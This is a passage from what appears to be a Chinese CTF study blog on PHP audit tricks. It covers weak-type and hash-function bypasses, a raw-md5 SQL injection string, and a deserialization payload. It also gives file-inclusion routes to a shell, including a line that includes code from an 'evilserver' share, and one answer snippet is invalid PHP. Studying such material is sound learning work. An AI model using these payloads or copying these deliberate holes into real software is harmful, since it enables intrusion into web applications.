class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null</span></span><br><span class=\"line\">$name = addslashes($_POST[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">$r = $db-&gt;get_row(<span class=\"string\">\"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($r[<span class=\"string\">'pass'</span>] === md5($_POST[<span class=\"string\">'pass'</span>])) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"success\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"json传数据-“key”-0\"><a href=\"#json传数据-“key”-0\" class=\"headerlink\" title=\"json传数据{“key”:0}\"></a>json传数据{“key”:0}</h3><p>PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">application/x-www-form-urlencoded</span><br><span class=\"line\">multipart/form-data</span><br><span class=\"line\">application/json</span><br><span class=\"line\">application/xml</span><br></pre></td></tr></table></figure></p>\n<p>第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.</p>\n<p>{“key”:”0”}</p>\n<p>这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：</p>\n<p>{“key”:0}</p>\n<h3 id=\"strcmp漏洞1：返回0\"><a href=\"#strcmp漏洞1：返回0\" class=\"headerlink\" title=\"strcmp漏洞1：返回0\"></a>strcmp漏洞1：返回0</h3><p>适用与5.3之前版本的php</p>\n<p><code>int strcmp ( string $str1 , string $str2 )</code><br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##flag[]=admin</span></span><br><span class=\"line\">define(<span class=\"string\">'FLAG'</span>, <span class=\"string\">'pwnhub&#123;THIS_IS_FLAG&#125;'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (strcmp($_GET[<span class=\"string\">'flag'</span>], FLAG) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"success, flag:\"</span> . FLAG;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"strcmp漏洞2：返回Null\"><a href=\"#strcmp漏洞2：返回Null\" class=\"headerlink\" title=\"strcmp漏洞2：返回Null\"></a>strcmp漏洞2：返回Null</h3><p>修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。<br>array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。<br><code>strcmp($c[1],$d)</code></p>\n<h3 id=\"strcmp漏洞3-判断使用的是\"><a href=\"#strcmp漏洞3-判断使用的是\" class=\"headerlink\" title=\"strcmp漏洞3: 判断使用的是 ==\"></a>strcmp漏洞3: 判断使用的是 ==</h3><p>而判断使用的是==，当NULL==0是 bool(true)</p>\n<h3 id=\"in-array，array-search-弱类型比较\"><a href=\"#in-array，array-search-弱类型比较\" class=\"headerlink\" title=\"in_array，array_search 弱类型比较\"></a>in_array，array_search 弱类型比较</h3><p>松散比较下，任何string都等于true：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'</span></span><br><span class=\"line\"><span class=\"comment\">// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'</span></span><br><span class=\"line\"><span class=\"comment\">// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(is_array(@$a[<span class=\"string\">\"a2\"</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(count($a[<span class=\"string\">\"a2\"</span>])!==<span class=\"number\">5</span> <span class=\"keyword\">OR</span> !is_array($a[<span class=\"string\">\"a2\"</span>][<span class=\"number\">0</span>])) <span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>);</span><br><span class=\"line\">        $pos = array_search(<span class=\"string\">\"ctf\"</span>, $a[<span class=\"string\">\"a2\"</span>]);</span><br><span class=\"line\">        $pos===<span class=\"keyword\">false</span>?<span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>):<span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($a[<span class=\"string\">\"a2\"</span>] <span class=\"keyword\">as</span> $key=&gt;$val)&#123;</span><br><span class=\"line\">            $val===<span class=\"string\">\"ctf\"</span>?<span class=\"keyword\">die</span>(<span class=\"string\">\"nope\"</span>):<span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $v2=<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"sha1-md5-报错相等绕过（False-False）\"><a href=\"#sha1-md5-报错相等绕过（False-False）\" class=\"headerlink\" title=\"sha1() md5() 报错相等绕过（False === False）\"></a>sha1() md5() 报错相等绕过（False === False）</h3><p>sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false<br>md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##?name[]=1&amp;password[]=2</span></span><br><span class=\"line\"><span class=\"comment\">## === 两边都是false则成立</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"strpos数组NULL-Null-False\"><a href=\"#strpos数组NULL-Null-False\" class=\"headerlink\" title=\"strpos数组NULL(Null !== False)\"></a>strpos数组NULL(Null !== False)</h3><p>strpos()输入数组出错返回null</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span> ($_GET[<span class=\"string\">'nctf'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (@ereg (<span class=\"string\">\"^[1-9]+$\"</span>, $_GET[<span class=\"string\">'nctf'</span>]) === <span class=\"keyword\">FALSE</span>) <span class=\"comment\"># %00截断</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'必须输入数字才行'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (strpos ($_GET[<span class=\"string\">'nctf'</span>], <span class=\"string\">'#biubiubiu'</span>) !== <span class=\"keyword\">FALSE</span>)   </span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'骚年，继续努力吧啊~'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"十六进制与十进制比较\"><a href=\"#十六进制与十进制比较\" class=\"headerlink\" title=\"十六进制与十进制比较\"></a>十六进制与十进制比较</h3><p>== 两边的十六进制与十进制比较，是可以相等的。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?password=0xdeadc0de</span></span><br><span class=\"line\"><span class=\"comment\">#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">noother_says_correct</span><span class=\"params\">($temp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $flag = <span class=\"string\">'flag&#123;test&#125;'</span>;</span><br><span class=\"line\">    $one = ord(<span class=\"string\">'1'</span>);  <span class=\"comment\">//ord — 返回字符的 ASCII 码值</span></span><br><span class=\"line\">    $nine = ord(<span class=\"string\">'9'</span>); <span class=\"comment\">//ord — 返回字符的 ASCII 码值</span></span><br><span class=\"line\">    $number = <span class=\"string\">'3735929054'</span>;</span><br><span class=\"line\">    <span class=\"comment\">// Check all the input characters!</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($number); $i++)</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"comment\">// Disallow all the digits!</span></span><br><span class=\"line\">        $digit = ord($temp&#123;$i&#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class=\"comment\">## 1到9不允许，但0允许</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Aha, digit not allowed!</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"flase\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($number == $temp) <span class=\"comment\"># </span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$temp = $_GET[<span class=\"string\">'password'</span>];</span><br><span class=\"line\"><span class=\"keyword\">echo</span> noother_says_correct($temp);</span><br></pre></td></tr></table></figure>\n<h2 id=\"md5注入带入’or’\"><a href=\"#md5注入带入’or’\" class=\"headerlink\" title=\"md5注入带入’or’\"></a>md5注入带入’or’</h2><p>原理：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(string,raw)</span><br><span class=\"line\">raw\t可选。规定十六进制或二进制输出格式：</span><br><span class=\"line\">    <span class=\"keyword\">TRUE</span> - 原始 <span class=\"number\">16</span> 字符二进制格式</span><br><span class=\"line\">    <span class=\"keyword\">FALSE</span> - 默认。<span class=\"number\">32</span> 字符十六进制数</span><br></pre></td></tr></table></figure></p>\n<p>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为<code>&#39;or&#39;&lt;trash&gt;</code> 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 执行顺序:字符串：ffifdyop -&gt; md5()加密成276f722736c95d99e921722cf9ed621c-&gt;md5(,true)将16进制转成字符串`'or'&lt;trash&gt;`-&gt;sql执行`'or'&lt;trash&gt;`造成注入</span></span><br><span class=\"line\">$sql = <span class=\"string\">\"SELECT * FROM admin WHERE username = admin pass = '\"</span>.md5($password,<span class=\"keyword\">true</span>).<span class=\"string\">\"'\"</span>;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"switch没有break\"><a href=\"#switch没有break\" class=\"headerlink\" title=\"switch没有break\"></a>switch没有break</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#这里case 0 和 1 没有break,使得程序继续往下执行。</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'which'</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $which = $_GET[<span class=\"string\">'which'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ($which)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0</span>:</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">require_once</span> $which.<span class=\"string\">'.php'</span>;</span><br><span class=\"line\">         <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> GWF_HTML::error(<span class=\"string\">'PHP-0817'</span>, <span class=\"string\">'Hacker NoNoNo!'</span>, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- index.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"string\">'shield.php'</span>);</span><br><span class=\"line\">\t$x = <span class=\"keyword\">new</span> Shield();</span><br><span class=\"line\">\t<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'class'</span>]) &amp;&amp; $g = $_GET[<span class=\"string\">'class'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($g)) &#123;</span><br><span class=\"line\">\t\t$x = unserialize($g);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $x-&gt;readfile();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;img src=<span class=\"string\">\"showimg.php?img=c2hpZWxkLmpwZw==\"</span> width=<span class=\"string\">\"100%\"</span>/&gt;</span><br><span class=\"line\">&lt;!-- shield.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"comment\">//flag is in pctf.php</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shield</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename = <span class=\"string\">''</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span> -&gt; file = $filename;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readfile</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span>  </span><br><span class=\"line\">\t\t\t&amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'\\\\'</span>)==<span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> @file_get_contents(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;!-- showimg.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$f = $_GET[<span class=\"string\">'img'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($f)) &#123;</span><br><span class=\"line\">\t\t$f = base64_decode($f);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (stripos($f,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos($f,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos($f,<span class=\"string\">'\\\\'</span>)===<span class=\"keyword\">FALSE</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//stripos — 查找字符串首次出现的位置（不区分大小写）</span></span><br><span class=\"line\">\t\t&amp;&amp; stripos($f,<span class=\"string\">'pctf'</span>)===<span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">\t\t\treadfile($f);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"File not found!\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?class=O:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125;</span></span><br><span class=\"line\">&lt;!-- answer.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'shield.php'</span>);</span><br><span class=\"line\">$x = class Shield();</span><br><span class=\"line\">$g = serialize($x);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $g;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- shield.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"comment\">//flag is in pctf.php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shield</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename = <span class=\"string\">'pctf.php'</span>)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span> -&gt; file = $filename;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readfile</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span>  </span><br><span class=\"line\">            &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'\\\\'</span>)==<span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> @file_get_contents(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><p>原理：</p>\n<p>include()/include_once()，require()/require_once()，中的变量可控</p>\n<p>利用过程：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传图片（含有php代码的图片） </span><br><span class=\"line\">读文件，读php文件 </span><br><span class=\"line\">包含日志文件getshell </span><br><span class=\"line\">包含/proc/self/envion文件getshell </span><br><span class=\"line\">如果有phpinfo可以包含临时文件 </span><br><span class=\"line\">包含data://或php://input等伪协议（需要allow_url_include=On)</span><br></pre></td></tr></table></figure></p>\n<p>封闭协议：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:// — 访问本地文件系统</span><br><span class=\"line\">http:// — 访问 HTTP(s) 网址</span><br><span class=\"line\">ftp:// — 访问 FTP(s) URLs</span><br><span class=\"line\">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class=\"line\">zlib:// — 压缩流</span><br><span class=\"line\">data:// — 数据（RFC 2397）</span><br><span class=\"line\">glob:// — 查找匹配的文件路径模式</span><br><span class=\"line\">phar:// — PHP 归档</span><br><span class=\"line\">ssh2:// — Secure Shell 2</span><br><span class=\"line\">rar:// — RAR</span><br><span class=\"line\">ogg:// — 音频流</span><br><span class=\"line\">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 访问共享目录</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> (<span class=\"string\">'\\evilservershell.php'</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"提交参数无过滤\"><a href=\"#提交参数无过滤\" class=\"headerlink\" title=\"提交参数无过滤\"></a>提交参数无过滤</h2><p>原理:过滤了GPC，但没有过滤其它部分。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传文件相关变量如<span class=\"variable\">$_FIle</span></span><br><span class=\"line\"><span class=\"variable\">$_GET</span>，<span class=\"variable\">$_POST</span>，<span class=\"variable\">$_Cookie</span>，<span class=\"variable\">$_SERVER</span>，<span class=\"variable\">$_ENV</span>，<span class=\"variable\">$_SESSION</span>，<span class=\"variable\">$_REQUEST</span></span><br><span class=\"line\">HTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响</span><br><span class=\"line\"><span class=\"variable\">$_HTTP_COOKIE_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_ENV_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_GET_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_POST_FILES</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_POST_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_SERVER_VARS</span></span><br></pre></td></tr></table></figure>\n<p>案例：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 